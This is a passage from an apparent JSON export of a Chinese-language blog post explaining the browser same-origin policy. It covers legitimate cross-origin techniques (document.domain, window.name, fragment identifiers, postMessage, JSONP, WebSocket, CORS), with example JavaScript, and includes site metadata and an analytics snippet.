同源策略的目的\n\n为了保证用户信息的安全，防止恶意的网站窃取数据。\n\n### 受限制的行为\n\n* Cookie、LocalStorage 和 IndexDB 无法读取。\n* DOM 无法获得。\n* AJAX 请求不能发送。\n\n## cookie跨域\n\nCookie 是服务器写入浏览器的一小段信息，是储存在用户本地终端上的数据，通常被用来记录访问者的一些信息（尽管这并不安全），只有同源的网页才能共享。\n\n不过这个共享范围比同源稍宽松些。\n\n### 解决办法\n\n如果两个网页一级域名相同，只是二级域名不同，那么浏览器允许通过设置document.domain来共享 Cookie。\n\n例如：\n\n1. 对A,B网页同时设置：`document.domain = 'example.com';`\n2. 在A网页中通过脚本设置一个Cookie：`document.cookie = \"test1=hello\";`\n3. B网页就可以读到这个 Cookie：`var allCookie = document.cookie;`\n\n> 注意：这种方法只适用于 Cookie 和 iframe 窗口（下一节会谈到），LocalStorage 和 IndexDB 无法通过这种方法规避同源政策，而要使用下文介绍的PostMessage API。\n>\n> 另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如为`.example.com`设置`Set-Cookie: key=value; domain=.example.com; path=/`这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。\n\n## iframe跨域\n\n如果两个网页不同源，就无法拿到对方的DOM。\n典型的例子是`iframe`窗口和`window.open`方法打开的窗口，它们与父窗口无法通信。\n\n比如，父窗口运行下面的命令，如果`iframe`窗口不是同源，就会报错。\n\n\tdocument.getElementById(\"myIFrame\").contentWindow.document\n\t// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.\n\n上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。\n反之亦然，子窗口获取主窗口的DOM也会报错。\n\n\twindow.parent.document.body\n\t// 报错\n\n### 解决办法\n\n#### 如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的`document.domain`属性，就可以规避同源策略来访问DOM。\n\n举例如下\n\n在a.html中\n\n\tdocument.domain = 'a.com';\n\tvar ifr = document.createElement('iframe');\n\tifr.src = 'http://script.a.com/b.html';\n\tifr.style.display = 'none';\n\tdocument.body.appendChild(ifr);\n\tifr.onload = function(){\n\t    var doc = ifr.contentDocument || ifr.contentWindow.document;\n\t    // 在这里操纵b.html\n\t    alert(doc.getElementsByTagName(\"h1\")[0].childNodes[0].nodeValue);\n\t};\n\nb.html中\n\n\tdocument.domain = 'a.com';\n\n#### 对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题\n\n1. 片段识别符（fragment identifier）\n2. 设置`window.name`\n3. 跨文档通信API（Cross-document messaging）\n\n##### 片段标识符\n\n\n片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如`http://example.com/x.html#fragment的#fragment`。如果只是改变片段标识符，页面不会重新刷新。\n\n父窗口可以把信息，写入子窗口的片段标识符。\n\n\tvar src = originURL + '#' + data;\n\tdocument.getElementById('myIFrame').src = src;\n\n子窗口通过监听`hashchange`事件得到通知。\n\n\twindow.onhashchange = checkMessage;\n\n\tfunction checkMessage() {\n\t  var message = window.location.hash;\n\t  // ...\n\t}\n\n同样的，子窗口也可以改变父窗口的片段标识符。\n\n\tparent.location.href= target + \"#\" + hash;\n\n##### 设置`window.name`\n\n浏览器窗口有`window.name`属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。\n\n有三个页面：\n\n* a.com/app.html：应用页面。\n* a.com/proxy.html：代理文件，一般是一个没有任何内容的html文件，需要和应用页面在同一域下。\n* b.com/data.html：应用页面需要获取数据的页面，可称为数据页面。\n\n过程如下：\n\n1. 在应用页面`（a.com/app.html）`中创建一个`iframe`，把其`src`指向数据页面`（b.com/data.html）`。数据页面`（b.com/data.html）`设置window.name时，由于同源，会自动把数据附加到这个`iframe`的`window.name`上，代码如下：\n\t\t<script type=\"text/javascript\">\n\t    \t\twindow.name = 'I was there!';    //这里是要传输的数据，大小一般为2M，IE和firefox下可以大至32M左右。\n\t\t\t\t\t\t\t\t\t\t\t\t //数据格式可以自定义，如json、字符串\n\t\t</script>\n2. 在应用页面`（a.com/app.html）`中监听`iframe`的`onload`事件，在此事件中设置这个`iframe`的`src`指向本地域的代理文件（代理文件和应用页面在同一域下，所以可以相互通信）。app.html部分代码如下：\n\t\t<script type=\"text/javascript\">\n\t\t    var state = 0, \n\t\t    iframe = document.createElement('iframe'),\n\t\t    loadfn = function() {\n\t\t        if (state === 1) {\n\t\t            var data = iframe.contentWindow.name;    // 读取数据\n\t\t            alert(data);    //弹出'I was there!'\n\t\t        } else if (state === 0) {\n\t\t            state = 1;\n\t\t            iframe.contentWindow.location = \"http://a.com/proxy.html\";    // 设置的代理文件，此时由于iframe的loaction改变，又一次触发load事件\n\t\t        }  \n\t\t    };\n\t\t    iframe.src = 'http://b.com/data.html';\n\t\t    if (iframe.attachEvent) {\n\t\t        iframe.attachEvent('onload', loadfn);\n\t\t    } else {\n\t\t        iframe.onload  = loadfn;\n\t\t    }\n\t\t    document.body.appendChild(iframe);\n\t\t</script>\n3. 获取数据以后销毁这个`iframe`，释放内存；这也保证了安全（不被其他域frame js访问）。\n\t\t<script type=\"text/javascript\">\n\t\t    iframe.contentWindow.document.write('');\n\t\t    iframe.contentWindow.close();\n\t\t    document.body.removeChild(iframe);\n\t\t</script>\n\n总结起来即：iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。\n\n* 优点: window.name容量很大，可以放置非常长的字符串；\n* 缺点: 必须监听子窗口window.name属性的变化，影响网页性能。\n\n##### 跨文档通信API--postMessage()\n\nHTML5新增一个`window.postMessage`方法，允许跨窗口通信，不论这两个窗口是否同源。并且支持基于web的实时消息传递。\n\n\totherWindow.postMessage(message, targetOrigin);\n\n* `otherWindow`: 对接收信息页面的window的引用。可以是页面中`iframe`的`contentWindow`属性；`window.open`的返回值；通过`name`或下标从`window.frames`取到的值。\n* `message`: 所要发送的数据，string类型。\n* `targetOrigin`: 用于限制otherWindow，即\"协议 + 域名 + 端口\"，`*`表示不限制域名，向所有窗口发送\n\n举例来说，父窗口`http://aaa.com`与子窗口`http://bbb.com`互发消息\n\n父->子\n\n\tvar popup = window.open('http://bbb.com', 'title');\n\tpopup.postMessage('Hello World!', 'http://bbb.com');\n\n子->父\n\n\twindow.opener.postMessage('Nice to see you', 'http://aaa.com');\n\n接受消息：message事件\n\n\twindow.addEventListener('message', function(e) {\n\t  console.log(e.data);\n\t},false);\n\n`message`事件的事件对象`event`，提供以下三个属性。\n\n* event.source：发送消息的窗口\n* event.origin: 消息发向的网址\n* event.data: 消息内容\n\n下面的例子是，子窗口通过`event.source`属性引用父窗口，然后发送消息。\n\n\twindow.addEventListener('message', receiveMessage);\n\tfunction receiveMessage(event) {\n\t  event.source.postMessage('Nice to see you!', '*');\n\t}\n\n`event.origin`属性可以过滤不是发给本窗口的消息。\n\n\twindow.addEventListener('message', receiveMessage);\n\tfunction receiveMessage(event) {\n\t  if (event.origin !== 'http://aaa.com') return;\n\t  if (event.data === 'Hello World') {\n\t      event.source.postMessage('Hello', event.origin);\n\t  } else {\n\t    console.log(event.data);\n\t  }\n\t}\n\n\n## Ajax跨域\n\n同源政策规定，AJAX请求只能发给同源的网址。\n\n除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。\n\n* JSONP\n* WebSocket\n* CORS\n\n### JSONP\n\nJSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。\n\n它的基本思想是，网页通过添加一个`<script>`元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。\n\n举个例子\n\n\tfunction addScriptTag(src) {\n\t  var script = document.createElement('script');\n\t  script.setAttribute(\"type\",\"text/javascript\");\n\t  script.src = src;\n\t  document.body.appendChild(script);\n\t}\n\t\n\twindow.onload = function () {\n\t  addScriptTag('http://example.com/ip?callback=foo');\n\t}\n\t\n\tfunction foo(data) {\n\t  console.log('Your public IP address is: ' + data.ip);\n\t};\n\n上面代码通过动态添加`<script>`元素，向服务器`example.com`发出请求。\n\n> 注意：该请求的查询字符串有一个`callback`参数（在服务器中须对其进行相关声明和定义），用来指定回调函数的名字，这对于JSONP是必需的。假设目标返回的数据是`[\"customername1\",\"customername2\"]`那么真正返回到客户端的数据为`foo([\"customername1\",\"customername2\"])`\n\n服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。\n\n由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了`foo`函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用`JSON.parse`的步骤。\n\n### WebSocket跨域\n\nWebSocket是一种通信协议，使用`ws://`（非加密）和`wss://`（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。\n\n下面是一个例子，浏览器发出的WebSocket请求的头信息\n\n\tGET /chat HTTP/1.1\n\tHost: server.example.com\n\tUpgrade: websocket\n\tConnection: Upgrade\n\tSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\n\tSec-WebSocket-Protocol: chat, superchat\n\tSec-WebSocket-Version: 13\n\tOrigin: http://example.com\n\n上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。\n\n正是因为有了`Origin`这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。\n\n\tHTTP/1.1 101 Switching Protocols\n\tUpgrade: websocket\n\tConnection: Upgrade\n\tSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\n\tSec-WebSocket-Protocol: chat\n\n### CORS跨域\n\n跨源资源分享（Cross-Origin Resource Sharing）\n\n它是W3C标准，是跨源AJAX请求的根本解决方法。\n\n相比JSONP只能发GET请求，CORS允许任何类型的请求。\n\n[CORS跨域详细](http://www.ruanyifeng.com/blog/2016/04/cors.html)\n\n\n****\n\n参考链接\n\n* [浏览器同源政策及其规避方法](http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html)\n* [JavaScript跨域总结与解决办法](http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html)\n\n","slug":"js跨域问题","published":1,"date":"2017-04-04T02:15:55.878Z","updated":"2017-04-08T16:24:03.408Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s3e0004l8sl9tzktdzd","content":"<h2 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h2><h3 id=\"同源包括三个相同\"><a href=\"#同源包括三个相同\" class=\"headerlink\" title=\"同源包括三个相同\"></a>同源包括三个相同</h3><ul>\n<li>协议（protocol）相同</li>\n<li>域名（domain/host）相同</li>\n<li>端口（port）相同</li>\n</ul>\n<a id=\"more\"></a>\n<p>举例来说，对于<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略）。它的同源情况如下。</p>\n<ul>\n<li><a href=\"http://www.example.com/dir2/other.html：同源\" target=\"_blank\" rel=\"external\">http://www.example.com/dir2/other.html：同源</a></li>\n<li><a href=\"http://example.com/dir/other.html：不同源（域名不同）\" target=\"_blank\" rel=\"external\">http://example.com/dir/other.html：不同源（域名不同）</a></li>\n<li><a href=\"http://v2.www.example.com/dir/other.html：不同源（域名不同）\" target=\"_blank\" rel=\"external\">http://v2.www.example.com/dir/other.html：不同源（域名不同）</a></li>\n<li><a href=\"http://www.example.com:81/dir/other.html：不同源（端口不同）\" target=\"_blank\" rel=\"external\">http://www.example.com:81/dir/other.html：不同源（端口不同）</a></li>\n</ul>\n<p>更多例子：</p>\n<table>\n<thead>\n<tr>\n<th>URL</th>\n<th>说明</th>\n<th>是否允许通信</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"http://www.a.com/a.js\" target=\"_blank\" rel=\"external\">http://www.a.com/a.js</a><br><a href=\"http://www.a.com/b.js\" target=\"_blank\" rel=\"external\">http://www.a.com/b.js</a></td>\n<td>同一域名下</td>\n<td>允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/lab/a.js\" target=\"_blank\" rel=\"external\">http://www.a.com/lab/a.js</a><br><a href=\"http://www.a.com/script/b.js\" target=\"_blank\" rel=\"external\">http://www.a.com/script/b.js</a></td>\n<td>同一域名下不同文件夹</td>\n<td>允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com:8000/a.js\" target=\"_blank\" rel=\"external\">http://www.a.com:8000/a.js</a><br><a href=\"http://www.a.com/b.js\" target=\"_blank\" rel=\"external\">http://www.a.com/b.js</a></td>\n<td>同一域名，不同端口</td>\n<td>不允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/a.js\" target=\"_blank\" rel=\"external\">http://www.a.com/a.js</a><br><a href=\"https://www.a.com/b.js\" target=\"_blank\" rel=\"external\">https://www.a.com/b.js</a></td>\n<td>同一域名，不同协议</td>\n<td>不允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/a.js\" target=\"_blank\" rel=\"external\">http://www.a.com/a.js</a><br><a href=\"http://70.32.92.74/b.js\" target=\"_blank\" rel=\"external\">http://70.32.92.74/b.js</a></td>\n<td>域名和域名对应ip</td>\n<td>不允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/a.js\" target=\"_blank\" rel=\"external\">http://www.a.com/a.js</a><br><a href=\"http://script.a.com/b.js\" target=\"_blank\" rel=\"external\">http://script.a.com/b.js</a></td>\n<td>主域相同，子域不同</td>\n<td>不允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/a.js\" target=\"_blank\" rel=\"external\">http://www.a.com/a.js</a><br><a href=\"http://a.com/b.js\" target=\"_blank\" rel=\"external\">http://a.com/b.js</a></td>\n<td>同一域名，不同二级域名（同上）</td>\n<td>不允许（cookie这种情况下也不允许访问）</td>\n</tr>\n<tr>\n<td><a href=\"http://www.cnblogs.com/a.js\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/a.js</a><br><a href=\"http://a.com/b.js\" target=\"_blank\" rel=\"external\">http://a.com/b.js</a></td>\n<td>不同域名</td>\n<td>不允许</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>注意</p>\n<ol>\n<li>如果是协议和端口造成的跨域问题“前台”是无能为力的，</li>\n<li>在跨域问题上，域仅仅是通过“URL的首部”来识别而不会去尝试判断相同的ip地址对应着两个域或两个域是否在同一个ip上。</li>\n</ol>\n<blockquote>\n<p>“URL的首部”指<code>window.location.protocol</code> + <code>window.location.host</code>，也可以理解为“Domains, protocols and ports must match”。</p>\n</blockquote>\n</blockquote>\n<h3 id=\"同源策略的目的\"><a href=\"#同源策略的目的\" class=\"headerlink\" title=\"同源策略的目的\"></a>同源策略的目的</h3><p>为了保证用户信息的安全，防止恶意的网站窃取数据。</p>\n<h3 id=\"受限制的行为\"><a href=\"#受限制的行为\" class=\"headerlink\" title=\"受限制的行为\"></a>受限制的行为</h3><ul>\n<li>Cookie、LocalStorage 和 IndexDB 无法读取。</li>\n<li>DOM 无法获得。</li>\n<li>AJAX 请求不能发送。</li>\n</ul>\n<h2 id=\"cookie跨域\"><a href=\"#cookie跨域\" class=\"headerlink\" title=\"cookie跨域\"></a>cookie跨域</h2><p>Cookie 是服务器写入浏览器的一小段信息，是储存在用户本地终端上的数据，通常被用来记录访问者的一些信息（尽管这并不安全），只有同源的网页才能共享。</p>\n<p>不过这个共享范围比同源稍宽松些。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>如果两个网页一级域名相同，只是二级域名不同，那么浏览器允许通过设置document.domain来共享 Cookie。</p>\n<p>例如：</p>\n<ol>\n<li>对A,B网页同时设置：<code>document.domain = &#39;example.com&#39;;</code></li>\n<li>在A网页中通过脚本设置一个Cookie：<code>document.cookie = &quot;test1=hello&quot;;</code></li>\n<li>B网页就可以读到这个 Cookie：<code>var allCookie = document.cookie;</code></li>\n</ol>\n<blockquote>\n<p>注意：这种方法只适用于 Cookie 和 iframe 窗口（下一节会谈到），LocalStorage 和 IndexDB 无法通过这种方法规避同源政策，而要使用下文介绍的PostMessage API。</p>\n<p>另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如为<code>.example.com</code>设置<code>Set-Cookie: key=value; domain=.example.com; path=/</code>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。</p>\n</blockquote>\n<h2 id=\"iframe跨域\"><a href=\"#iframe跨域\" class=\"headerlink\" title=\"iframe跨域\"></a>iframe跨域</h2><p>如果两个网页不同源，就无法拿到对方的DOM。<br>典型的例子是<code>iframe</code>窗口和<code>window.open</code>方法打开的窗口，它们与父窗口无法通信。</p>\n<p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p>\n<pre><code>document.getElementById(&quot;myIFrame&quot;).contentWindow.document\n// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.\n</code></pre><p>上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。<br>反之亦然，子窗口获取主窗口的DOM也会报错。</p>\n<pre><code>window.parent.document.body\n// 报错\n</code></pre><h3 id=\"解决办法-1\"><a href=\"#解决办法-1\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><h4 id=\"如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document-domain属性，就可以规避同源策略来访问DOM。\"><a href=\"#如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document-domain属性，就可以规避同源策略来访问DOM。\" class=\"headerlink\" title=\"如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源策略来访问DOM。\"></a>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源策略来访问DOM。</h4><p>举例如下</p>\n<p>在a.html中</p>\n<pre><code>document.domain = &apos;a.com&apos;;\nvar ifr = document.createElement(&apos;iframe&apos;);\nifr.src = &apos;http://script.a.com/b.html&apos;;\nifr.style.display = &apos;none&apos;;\ndocument.body.appendChild(ifr);\nifr.onload = function(){\n    var doc = ifr.contentDocument || ifr.contentWindow.document;\n    // 在这里操纵b.html\n    alert(doc.getElementsByTagName(&quot;h1&quot;)[0].childNodes[0].nodeValue);\n};\n</code></pre><p>b.html中</p>\n<pre><code>document.domain = &apos;a.com&apos;;\n</code></pre><h4 id=\"对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题\"><a href=\"#对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题\" class=\"headerlink\" title=\"对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题\"></a>对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题</h4><ol>\n<li>片段识别符（fragment identifier）</li>\n<li>设置<code>window.name</code></li>\n<li>跨文档通信API（Cross-document messaging）</li>\n</ol>\n<h5 id=\"片段标识符\"><a href=\"#片段标识符\" class=\"headerlink\" title=\"片段标识符\"></a>片段标识符</h5><p>片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如<code>http://example.com/x.html#fragment的#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p>\n<p>父窗口可以把信息，写入子窗口的片段标识符。</p>\n<pre><code>var src = originURL + &apos;#&apos; + data;\ndocument.getElementById(&apos;myIFrame&apos;).src = src;\n</code></pre><p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>\n<pre><code>window.onhashchange = checkMessage;\n\nfunction checkMessage() {\n  var message = window.location.hash;\n  // ...\n}\n</code></pre><p>同样的，子窗口也可以改变父窗口的片段标识符。</p>\n<pre><code>parent.location.href= target + &quot;#&quot; + hash;\n</code></pre><h5 id=\"设置window-name\"><a href=\"#设置window-name\" class=\"headerlink\" title=\"设置window.name\"></a>设置<code>window.name</code></h5><p>浏览器窗口有<code>window.name</code>属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。</p>\n<p>有三个页面：</p>\n<ul>\n<li>a.com/app.html：应用页面。</li>\n<li>a.com/proxy.html：代理文件，一般是一个没有任何内容的html文件，需要和应用页面在同一域下。</li>\n<li>b.com/data.html：应用页面需要获取数据的页面，可称为数据页面。</li>\n</ul>\n<p>过程如下：</p>\n<ol>\n<li>在应用页面<code>（a.com/app.html）</code>中创建一个<code>iframe</code>，把其<code>src</code>指向数据页面<code>（b.com/data.html）</code>。数据页面<code>（b.com/data.html）</code>设置window.name时，由于同源，会自动把数据附加到这个<code>iframe</code>的<code>window.name</code>上，代码如下：<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n        window.name = &apos;I was there!&apos;;    //这里是要传输的数据，大小一般为2M，IE和firefox下可以大至32M左右。\n                                         //数据格式可以自定义，如json、字符串\n&lt;/script&gt;\n</code></pre></li>\n<li>在应用页面<code>（a.com/app.html）</code>中监听<code>iframe</code>的<code>onload</code>事件，在此事件中设置这个<code>iframe</code>的<code>src</code>指向本地域的代理文件（代理文件和应用页面在同一域下，所以可以相互通信）。app.html部分代码如下：<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    var state = 0, \n    iframe = document.createElement(&apos;iframe&apos;),\n    loadfn = function() {\n        if (state === 1) {\n            var data = iframe.contentWindow.name;    // 读取数据\n            alert(data);    //弹出&apos;I was there!&apos;\n        } else if (state === 0) {\n            state = 1;\n            iframe.contentWindow.location = &quot;http://a.com/proxy.html&quot;;    // 设置的代理文件，此时由于iframe的loaction改变，又一次触发load事件\n        }  \n    };\n    iframe.src = &apos;http://b.com/data.html&apos;;\n    if (iframe.attachEvent) {\n        iframe.attachEvent(&apos;onload&apos;, loadfn);\n    } else {\n        iframe.onload  = loadfn;\n    }\n    document.body.appendChild(iframe);\n&lt;/script&gt;\n</code></pre></li>\n<li>获取数据以后销毁这个<code>iframe</code>，释放内存；这也保证了安全（不被其他域frame js访问）。<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    iframe.contentWindow.document.write(&apos;&apos;);\n    iframe.contentWindow.close();\n    document.body.removeChild(iframe);\n&lt;/script&gt;\n</code></pre></li>\n</ol>\n<p>总结起来即：iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。</p>\n<ul>\n<li>优点: window.name容量很大，可以放置非常长的字符串；</li>\n<li>缺点: 必须监听子窗口window.name属性的变化，影响网页性能。</li>\n</ul>\n<h5 id=\"跨文档通信API–postMessage\"><a href=\"#跨文档通信API–postMessage\" class=\"headerlink\" title=\"跨文档通信API–postMessage()\"></a>跨文档通信API–postMessage()</h5><p>HTML5新增一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。并且支持基于web的实时消息传递。</p>\n<pre><code>otherWindow.postMessage(message, targetOrigin);\n</code></pre><ul>\n<li><code>otherWindow</code>: 对接收信息页面的window的引用。可以是页面中<code>iframe</code>的<code>contentWindow</code>属性；<code>window.open</code>的返回值；通过<code>name</code>或下标从<code>window.frames</code>取到的值。</li>\n<li><code>message</code>: 所要发送的数据，string类型。</li>\n<li><code>targetOrigin</code>: 用于限制otherWindow，即”协议 + 域名 + 端口”，<code>*</code>表示不限制域名，向所有窗口发送</li>\n</ul>\n<p>举例来说，父窗口<code>http://aaa.com</code>与子窗口<code>http://bbb.com</code>互发消息</p>\n<p>父-&gt;子</p>\n<pre><code>var popup = window.open(&apos;http://bbb.com&apos;, &apos;title&apos;);\npopup.postMessage(&apos;Hello World!&apos;, &apos;http://bbb.com&apos;);\n</code></pre><p>子-&gt;父</p>\n<pre><code>window.opener.postMessage(&apos;Nice to see you&apos;, &apos;http://aaa.com&apos;);\n</code></pre><p>接受消息：message事件</p>\n<pre><code>window.addEventListener(&apos;message&apos;, function(e) {\n  console.log(e.data);\n},false);\n</code></pre><p><code>message</code>事件的事件对象<code>event</code>，提供以下三个属性。</p>\n<ul>\n<li>event.source：发送消息的窗口</li>\n<li>event.origin: 消息发向的网址</li>\n<li>event.data: 消息内容</li>\n</ul>\n<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>\n<pre><code>window.addEventListener(&apos;message&apos;, receiveMessage);\nfunction receiveMessage(event) {\n  event.source.postMessage(&apos;Nice to see you!&apos;, &apos;*&apos;);\n}\n</code></pre><p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>\n<pre><code>window.addEventListener(&apos;message&apos;, receiveMessage);\nfunction receiveMessage(event) {\n  if (event.origin !== &apos;http://aaa.com&apos;) return;\n  if (event.data === &apos;Hello World&apos;) {\n      event.source.postMessage(&apos;Hello&apos;, event.origin);\n  } else {\n    console.log(event.data);\n  }\n}\n</code></pre><h2 id=\"Ajax跨域\"><a href=\"#Ajax跨域\" class=\"headerlink\" title=\"Ajax跨域\"></a>Ajax跨域</h2><p>同源政策规定，AJAX请求只能发给同源的网址。</p>\n<p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p>\n<ul>\n<li>JSONP</li>\n<li>WebSocket</li>\n<li>CORS</li>\n</ul>\n<h3 id=\"JSONP\"><a href=\"#JSONP\" class=\"headerlink\" title=\"JSONP\"></a>JSONP</h3><p>JSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。</p>\n<p>它的基本思想是，网页通过添加一个<code>&lt;script&gt;</code>元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。</p>\n<p>举个例子</p>\n<pre><code>function addScriptTag(src) {\n  var script = document.createElement(&apos;script&apos;);\n  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);\n  script.src = src;\n  document.body.appendChild(script);\n}\n\nwindow.onload = function () {\n  addScriptTag(&apos;http://example.com/ip?callback=foo&apos;);\n}\n\nfunction foo(data) {\n  console.log(&apos;Your public IP address is: &apos; + data.ip);\n};\n</code></pre><p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。</p>\n<blockquote>\n<p>注意：该请求的查询字符串有一个<code>callback</code>参数（在服务器中须对其进行相关声明和定义），用来指定回调函数的名字，这对于JSONP是必需的。假设目标返回的数据是<code>[&quot;customername1&quot;,&quot;customername2&quot;]</code>那么真正返回到客户端的数据为<code>foo([&quot;customername1&quot;,&quot;customername2&quot;])</code></p>\n</blockquote>\n<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>\n<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>\n<h3 id=\"WebSocket跨域\"><a href=\"#WebSocket跨域\" class=\"headerlink\" title=\"WebSocket跨域\"></a>WebSocket跨域</h3><p>WebSocket是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>\n<p>下面是一个例子，浏览器发出的WebSocket请求的头信息</p>\n<pre><code>GET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nOrigin: http://example.com\n</code></pre><p>上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。</p>\n<p>正是因为有了<code>Origin</code>这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>\n<pre><code>HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat\n</code></pre><h3 id=\"CORS跨域\"><a href=\"#CORS跨域\" class=\"headerlink\" title=\"CORS跨域\"></a>CORS跨域</h3><p>跨源资源分享（Cross-Origin Resource Sharing）</p>\n<p>它是W3C标准，是跨源AJAX请求的根本解决方法。</p>\n<p>相比JSONP只能发GET请求，CORS允许任何类型的请求。</p>\n<p><a href=\"http://www.ruanyifeng.com/blog/2016/04/cors.html\" target=\"_blank\" rel=\"external\">CORS跨域详细</a></p>\n<hr>\n<p>参考链接</p>\n<ul>\n<li><a href=\"http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html\" target=\"_blank\" rel=\"external\">浏览器同源政策及其规避方法</a></li>\n<li><a href=\"http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html\" target=\"_blank\" rel=\"external\">JavaScript跨域总结与解决办法</a></li>\n</ul>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<h2 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h2><h3 id=\"同源包括三个相同\"><a href=\"#同源包括三个相同\" class=\"headerlink\" 